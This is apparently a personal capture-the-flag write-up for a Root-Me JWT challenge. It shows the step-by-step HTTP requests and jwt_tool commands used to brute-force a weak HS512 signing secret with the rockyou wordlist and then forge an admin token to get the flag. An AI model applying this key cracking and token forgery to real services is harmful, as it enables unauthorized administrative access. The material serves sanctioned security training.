# JSON Web Token (JWT) - Weak secret (key brute-forcing)



References

https://blog.pentesteracademy.com/hacking-jwt-tokens-bruteforcing-weak-signing-key-johntheripper-89f0c7e6a87

https://internet-lab.ru/ctf\_jwt\_weak\_secret

***

Accessing this url:

http://challenge01.root-me.org/web-serveur/ch59/hello

\->

I got this message:

message "Let's play a small game, I bet you cannot access to my super secret admin section. Make a GET request to /token and use the token you'll get to try to access /admin with a POST request."

\->

Just use normal url, since it is taken as GET request

Here is your token "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh\_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"

\->

then now use burp proxy to capture and modify the request

```
POST /web-serveur/ch59/admin HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1662082169.34.1.1662082188.0.0.0; _ga=GA1.1.536088429.1661133467; jwt= eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw;
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

\->

Response

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 02 Sep 2022 01:35:52 GMT
Content-Type: application/json
Content-Length: 76
Connection: close

{"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}
```

\->

Modified request

```
POST /web-serveur/ch59/admin HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1662082169.34.1.1662082188.0.0.0; _ga=GA1.1.536088429.1661133467;
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

\->

response

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 02 Sep 2022 01:41:37 GMT
Content-Type: application/json
Content-Length: 119
Connection: close

{"message": "I was right, you are not able to break my super crypto! I use HS512 so no need to have a strong secret!"}
```

now I need to crack the secret key

└─$ nano jwt.txt

install cupp

***

find the secret key with rockyou file

└─$ python3 /opt/jwt\_tool/jwt\_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh\_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw

└─$ sudo python3 /opt/jwt\_tool/jwt\_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh\_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw -C -d /usr/share/wordlists/rockyou.txt\
\-C : crack

Original JWT:

\[+] lol is the CORRECT key! You can tamper/fuzz the token contents (-T/-I) and sign it using: python3 jwt\_tool.py \[options here] -S HS512 -p "lol"

\->

now generate new jwt

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x\_S8F\_VPAjra\_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA

\->

send request

```
POST /web-serveur/ch59/admin HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1662082169.34.1.1662082188.0.0.0; _ga=GA1.1.536088429.1661133467;
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

\->

get the request here

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 02 Sep 2022 03:02:43 GMT
Content-Type: application/json
Content-Length: 77
Connection: close

{"result": "Congrats!! Here is your flag: (redacted)\n"}
```
